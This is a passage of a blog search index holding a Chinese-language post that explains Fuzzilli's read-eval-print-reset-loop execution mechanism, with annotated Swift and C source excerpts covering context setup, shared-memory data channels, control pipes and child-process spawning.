<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Fuzzilli-REPRL</title>
      <link href="/2023/10/20/Fuzzilli-REPRL/"/>
      <url>/2023/10/20/Fuzzilli-REPRL/</url>
      
        <content type="html"><![CDATA[<p>Fuzzilli采用了read-eval-print-reset-loop的方式运行，目标任务从管道或者共享内存输入脚本，再重置中间状态等待下一个脚本。目标任务从管道或共享内存输入脚本，并在重置中间状态后等待下一个脚本。参考了<a href="http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">forkserver 优化</a>的方法，旨在避免众所周知的缓慢的<code>execve()</code>系统调用和链接过程的开销。新进程通过copy-on-write方式保持在原始状态，从而实现持久性。持续的分叉和初始化循环是一个重要且可避免的瓶颈。底层API要么是无状态的，要么可以在不丢弃子进程的情况下可靠地重置为近乎原始的状态。在这种方案中，模糊器将测试用例提供给一个单独的、长期存在的进程，该进程读取输入数据并将其传递给要检测的API。该进程通过停止自己的执行来通知父级运行成功。最终，当父进程恢复时，该进程简单地循环回到开始处。</p><p>在<code>/fuzzilli/Sources/Fuzzilli/Execution/REPRL.swift</code> 中：</p><p>定义一个<code>REPRL</code>的类，实现<code>ScriptRunner</code> 来运行多个脚本并在执行之间重置全局状态。</p><p>1、首先调用libreprl库初始化相关的属性和上下文，注册监听Shutdown事件发生时销毁相关上下文：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="keyword">func</span> <span class="title function_">initialize</span>() &#123;</span><br><span class="line">        reprlContext <span class="operator">=</span> libreprl.reprl_create_context()</span><br><span class="line">        <span class="keyword">if</span> reprlContext <span class="operator">==</span> <span class="literal">nil</span> &#123;</span><br><span class="line">            logger.fatal(<span class="string">&quot;Failed to create REPRL context&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> argv <span class="operator">=</span> convertToCArray(processArguments)</span><br><span class="line">        <span class="keyword">let</span> envp <span class="operator">=</span> convertToCArray(env)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> reprl_initialize_context(reprlContext, argv, envp, <span class="comment">/* capture stdout */</span> <span class="number">1</span>, <span class="comment">/* capture stderr: */</span> <span class="number">1</span>) <span class="operator">!=</span> <span class="number">0</span> &#123;</span><br><span class="line">            logger.fatal(<span class="string">&quot;Failed to initialize REPRL context: <span class="subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        freeCArray(argv, numElems: processArguments.count)</span><br><span class="line">        freeCArray(envp, numElems: env.count)</span><br><span class="line"></span><br><span class="line">        fuzzer.registerEventListener(for: fuzzer.events.<span class="type">Shutdown</span>) &#123; <span class="keyword">_</span> <span class="keyword">in</span></span><br><span class="line">            reprl_destroy_context(<span class="keyword">self</span>.reprlContext)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2、设置环境变量的方法（setEnvironmentVariable）</p><p>3、实现run，根据最大执行数重新启动子进程，并在执行过程中处理错误和超时情况。通过记录脚本内容到缓冲区（scriptBuffer），支持启用诊断模式（enableDiagnostics），以便在后续执行中发现任何状态损坏的问题。通过使用libreprl库提供的函数来执行脚本和处理相关的上下文。最后返回一个Execution对象，其中包含了脚本执行的结果和相关的输出信息（stdout、stderr、fuzzout）：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">run</span>(<span class="keyword">_</span> <span class="params">script</span>: <span class="type">String</span>, <span class="params">withTimeout</span> <span class="params">timeout</span>: <span class="type">UInt32</span>) -&gt; <span class="type">Execution</span> &#123;</span><br><span class="line">        <span class="comment">// Log the current script into the buffer if diagnostics are enabled.</span></span><br><span class="line">        <span class="keyword">if</span> fuzzer.config.enableDiagnostics &#123;</span><br><span class="line">            <span class="keyword">self</span>.scriptBuffer <span class="operator">+=</span> script <span class="operator">+</span> <span class="string">&quot;<span class="subst">\n</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastExecId <span class="operator">+=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> execution <span class="operator">=</span> <span class="type">REPRLExecution</span>(from: <span class="keyword">self</span>) <span class="comment">// 返回program的执行结果</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">guard</span> script.count <span class="operator">&lt;=</span> <span class="type">REPRL_MAX_DATA_SIZE</span> <span class="keyword">else</span> &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Script too large to execute. Assuming timeout...&quot;</span>)</span><br><span class="line">            execution.outcome <span class="operator">=</span> .timedOut</span><br><span class="line">            <span class="keyword">return</span> execution</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        execsSinceReset <span class="operator">+=</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">var</span> freshInstance: <span class="type">Int32</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> execsSinceReset <span class="operator">&gt;</span> maxExecsBeforeRespawn &#123;</span><br><span class="line">            freshInstance <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">            execsSinceReset <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> fuzzer.config.enableDiagnostics &#123;</span><br><span class="line">                scriptBuffer.removeAll(keepingCapacity: <span class="literal">true</span>) <span class="comment">// 如果到达最大执行数需要清理重置</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> execTime: <span class="type">UInt64</span> <span class="operator">=</span> <span class="number">0</span>        <span class="comment">// In microseconds</span></span><br><span class="line">        <span class="keyword">let</span> timeout <span class="operator">=</span> <span class="type">UInt64</span>(timeout) <span class="operator">*</span> <span class="number">1000</span>        <span class="comment">// In microseconds</span></span><br><span class="line">        <span class="keyword">var</span> status: <span class="type">Int32</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">        script.withCString &#123;</span><br><span class="line">            status <span class="operator">=</span> reprl_execute(reprlContext, <span class="variable">$0</span>, <span class="type">UInt64</span>(script.count), <span class="type">UInt64</span>(timeout), <span class="operator">&amp;</span>execTime, freshInstance)</span><br><span class="line">                        <span class="comment">// reprl_execute实现read-eval-print-reset-loop的方式运行           </span></span><br><span class="line">                        <span class="comment">// If we fail, we retry after a short timeout and with a fresh instance. If we still fail, we give up trying</span></span><br><span class="line">            <span class="comment">// to execute this program. If we repeatedly fail to execute any program, we abort.</span></span><br><span class="line">            <span class="keyword">if</span> status <span class="operator">&lt;</span> <span class="number">0</span> &#123;</span><br><span class="line">                logger.warning(<span class="string">&quot;Script execution failed: <span class="subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>. Retrying in 1 second...&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> fuzzer.config.enableDiagnostics &#123;</span><br><span class="line">                    fuzzer.dispatchEvent(fuzzer.events.<span class="type">DiagnosticsEvent</span>, data: (name: <span class="string">&quot;REPRLFail&quot;</span>, content: scriptBuffer))</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Thread</span>.sleep(forTimeInterval: <span class="number">1</span>)</span><br><span class="line">                status <span class="operator">=</span> reprl_execute(reprlContext, <span class="variable">$0</span>, <span class="type">UInt64</span>(script.count), <span class="type">UInt64</span>(timeout), <span class="operator">&amp;</span>execTime, <span class="number">1</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> status <span class="operator">&lt;</span> <span class="number">0</span> &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Script execution failed again: <span class="subst">\(String(cString: reprl_get_last_error(reprlContext)))</span>. Giving up&quot;</span>)</span><br><span class="line">            <span class="comment">// If we weren&#x27;t able to successfully execute a script in the last N attempts, abort now...</span></span><br><span class="line">            recentlyFailedExecutions <span class="operator">+=</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> recentlyFailedExecutions <span class="operator">&gt;=</span> <span class="number">10</span> &#123;</span><br><span class="line">                logger.fatal(<span class="string">&quot;Too many consecutive REPRL failures&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            execution.outcome <span class="operator">=</span> .failed(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> execution</span><br><span class="line">        &#125;</span><br><span class="line">        recentlyFailedExecutions <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="type">RIFEXITED</span>(status) <span class="operator">!=</span> <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> code <span class="operator">=</span> <span class="type">REXITSTATUS</span>(status)</span><br><span class="line">            <span class="keyword">if</span> code <span class="operator">==</span> <span class="number">0</span> &#123;</span><br><span class="line">                execution.outcome <span class="operator">=</span> .succeeded</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                execution.outcome <span class="operator">=</span> .failed(<span class="type">Int</span>(code))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="type">RIFSIGNALED</span>(status) <span class="operator">!=</span> <span class="number">0</span> &#123;</span><br><span class="line">            execution.outcome <span class="operator">=</span> .crashed(<span class="type">Int</span>(<span class="type">RTERMSIG</span>(status)))</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="type">RIFTIMEDOUT</span>(status) <span class="operator">!=</span> <span class="number">0</span> &#123;</span><br><span class="line">            execution.outcome <span class="operator">=</span> .timedOut</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">fatalError</span>(<span class="string">&quot;Unknown REPRL exit status <span class="subst">\(status)</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        execution.execTime <span class="operator">=</span> <span class="type">Double</span>(execTime) <span class="operator">/</span> <span class="number">1_000_000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> execution</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在<code>fuzzilli/Sources/libreprl/libreprl-posix.c</code>中定义了read-eval-print-reset-loop的实现：</p><p>reprl_context结构体：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">reprl_context</span> &#123;</span><br><span class="line">    <span class="comment">// Whether reprl_initialize has been successfully performed on this context.</span></span><br><span class="line">    <span class="type">int</span> initialized;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read file descriptor of the control pipe. Only valid if a child process is running (i.e. pid is nonzero).</span></span><br><span class="line">    <span class="type">int</span> ctrl_in;</span><br><span class="line">    <span class="comment">// Write file descriptor of the control pipe. Only valid if a child process is running (i.e. pid is nonzero).</span></span><br><span class="line">    <span class="type">int</span> ctrl_out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Data channel REPRL -&gt; Child</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">data_channel</span>* data_in;</span><br><span class="line">    <span class="comment">// Data channel Child -&gt; REPRL</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">data_channel</span>* data_out;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Optional data channel for the child&#x27;s stdout and stderr.</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">data_channel</span>* child_stdout;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">data_channel</span>* child_stderr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// PID of the child process. Will be zero if no child process is currently running.</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Arguments and environment for the child process.</span></span><br><span class="line">    <span class="type">char</span>** argv;</span><br><span class="line">    <span class="type">char</span>** envp;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A malloc&#x27;d string containing a description of the last error that occurred.</span></span><br><span class="line">    <span class="type">char</span>* last_error;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>初始化相关上下文，就是保存和子进程通信要用到的fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> reprl_context* <span class="title function_">reprl_create_context</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// &quot;Reserve&quot; the well-known REPRL fds so no other fd collides with them.</span></span><br><span class="line">    <span class="comment">// This would cause various kinds of issues in reprl_spawn_child.</span></span><br><span class="line">    <span class="comment">// It would be enough to do this once per process in the case of multiple</span></span><br><span class="line">    <span class="comment">// REPRL instances, but it&#x27;s probably not worth the implementation effort.</span></span><br><span class="line">    <span class="type">int</span> devnull = open(<span class="string">&quot;/dev/null&quot;</span>, O_RDWR);</span><br><span class="line">    dup2(devnull, REPRL_CHILD_CTRL_IN);</span><br><span class="line">    dup2(devnull, REPRL_CHILD_CTRL_OUT);</span><br><span class="line">    dup2(devnull, REPRL_CHILD_DATA_IN);</span><br><span class="line">    dup2(devnull, REPRL_CHILD_DATA_OUT);</span><br><span class="line">    close(devnull);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> reprl_context));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>reprl_initialize_context主要调用reprl_create_data_channel初始化并返回data_channel：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">data_channel</span>* <span class="built_in">reprl_create_data_channel</span>(<span class="keyword">struct</span> reprl_context* ctx)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __linux__</span></span><br><span class="line">    <span class="comment">// memfd_create函数创建一个匿名的、可执行关闭的文件描述符</span></span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">memfd_create</span>(<span class="string">&quot;REPRL_DATA_CHANNEL&quot;</span>, MFD_CLOEXEC);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">char</span> path[] = <span class="string">&quot;/tmp/reprl_data_channel_XXXXXXXX&quot;</span>;</span><br><span class="line">    <span class="type">int</span> fd = <span class="built_in">mkostemp</span>(path, O_CLOEXEC);</span><br><span class="line">    <span class="built_in">unlink</span>(path);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span> || <span class="built_in">ftruncate</span>(fd, REPRL_MAX_DATA_SIZE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to create data channel file: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 将文件映射到内存中，创建一段可读可写的共享内存区域</span></span><br><span class="line">    <span class="type">char</span>* mapping = <span class="built_in">mmap</span>(<span class="number">0</span>, REPRL_MAX_DATA_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mapping == MAP_FAILED) &#123;</span><br><span class="line">        <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Failed to mmap data channel file: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">data_channel</span>* channel = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> data_channel));</span><br><span class="line">    channel-&gt;fd = fd;</span><br><span class="line">    channel-&gt;mapping = mapping;</span><br><span class="line">    <span class="keyword">return</span> channel;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>reprl_spawn_child会启动子进程并调用pipe()进行进程间进行通信，它创建两个用于控制通信的管道，一个用于子进程向父进程发送消息，另一个用于父进程向子进程发送消息，并设置子进程的输入输出重定向，将管道和数据通道与子进程的输入输出关联。在子进程中执行指定的可执行文件，父进程等待并读取子进程发送的HELO message消息，回复子进程HELO message启动子进程：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">reprl_spawn_child</span><span class="params">(<span class="keyword">struct</span> reprl_context* ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// This is also a good time to ensure the data channel backing files don&#x27;t grow too large.</span></span><br><span class="line">    <span class="built_in">ftruncate</span>(ctx-&gt;data_in-&gt;fd, REPRL_MAX_DATA_SIZE);</span><br><span class="line">    <span class="built_in">ftruncate</span>(ctx-&gt;data_out-&gt;fd, REPRL_MAX_DATA_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;child_stdout) <span class="built_in">ftruncate</span>(ctx-&gt;child_stdout-&gt;fd, REPRL_MAX_DATA_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;child_stderr) <span class="built_in">ftruncate</span>(ctx-&gt;child_stderr-&gt;fd, REPRL_MAX_DATA_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> crpipe[<span class="number">2</span>] = &#123; <span class="number">0</span>, <span class="number">0</span> &#125;;          <span class="comment">// control pipe child -&gt; reprl</span></span><br><span class="line">    <span class="type">int</span> cwpipe[<span class="number">2</span>] = &#123; <span class="number">0</span>, <span class="number">0</span> &#125;;          <span class="comment">// control pipe reprl -&gt; child</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(crpipe) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(cwpipe) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">close</span>(crpipe[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(crpipe[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reprl_error</span>(ctx, <span class="string">&quot;Could not create pipe for REPRL communication: %s&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;ctrl_in = crpipe[<span class="number">0</span>];</span><br><span class="line">    ctx-&gt;ctrl_out = cwpipe[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">fcntl</span>(ctx-&gt;ctrl_in, F_SETFD, FD_CLOEXEC);</span><br><span class="line">    <span class="built_in">fcntl</span>(ctx-&gt;ctrl_out, F_SETFD, FD_CLOEXEC);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __linux__</span></span><br><span class="line">    <span class="comment">// Use vfork() on Linux as that considerably improves the fuzzer performance. See also https://github.com/googleprojectzero/fuzzilli/issues/174</span></span><br><span class="line">    <span class="comment">// Due to vfork, the code executed in the child process *must not* modify any memory apart from its stack, as it will share the page table of its parent.</span></span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">vfork</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dup2</span>(cwpipe[<span class="number">0</span>], REPRL_CHILD_CTRL_IN) &lt; <span class="number">0</span> ||</span><br><span class="line">            <span class="built_in">dup2</span>(crpipe[<span class="number">1</span>], REPRL_CHILD_CTRL_OUT) &lt; <span class="number">0</span> ||</span><br><span class="line">            <span class="built_in">dup2</span>(ctx-&gt;data_out-&gt;fd, REPRL_CHILD_DATA_IN) &lt; <span class="number">0</span> ||</span><br><span class="line">            <span class="built_in">dup2</span>(ctx-&gt;data_in-&gt;fd, REPRL_CHILD_DATA_OUT) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;dup2 failed in the child: %s\n&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            _exit(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Unblock any blocked signals. It seems that libdispatch sometimes blocks delivery of certain signals.</span></span><br><span class="line">        <span class="type">sigset_t</span> newset;</span><br><span class="line">        <span class="built_in">sigemptyset</span>(&amp;newset);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sigprocmask</span>(SIG_SETMASK, &amp;newset, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;sigprocmask failed in the child: %s\n&quot;</span>, <span class="built_in">strerror</span>(errno));</span><br><span class="line">            _exit(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">close</span>(cwpipe[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(crpipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> devnull = <span class="built_in">open</span>(<span class="string">&quot;/dev/null&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">dup2</span>(devnull, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ctx-&gt;child_stdout) <span class="built_in">dup2</span>(ctx-&gt;child_stdout-&gt;fd, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">dup2</span>(devnull, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (ctx-&gt;child_stderr) <span class="built_in">dup2</span>(ctx-&gt;child_stderr-&gt;fd, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">dup2</span>(devnull, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">close</span>(devnull);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// close all other FDs. We try to use FD_CLOEXEC everywhere, but let&#x27;s be extra sure we don&#x27;t leak any fds to the child.</span></span><br><span class="line">        <span class="type">int</span> tablesize = <span class="built_in">getdtablesize</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">3</span>; i &lt; tablesize; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == REPRL_CHILD_CTRL_IN || i == REPRL_CHILD_CTRL_OUT || i == REPRL_CHILD_DATA_IN || i == REPRL_CHILD_DATA_OUT) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">close</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">execve</span>(ctx-&gt;argv[<span class="number">0</span>], ctx-&gt;argv, ctx-&gt;envp);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Failed to execute child process %s: %s\n&quot;</span>, ctx-&gt;argv[<span class="number">0</span>], <span class="built_in">strerror</span>(errno));</span><br><span class="line">        <span class="built_in">fflush</span>(stderr);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">close</span>(crpipe[<span 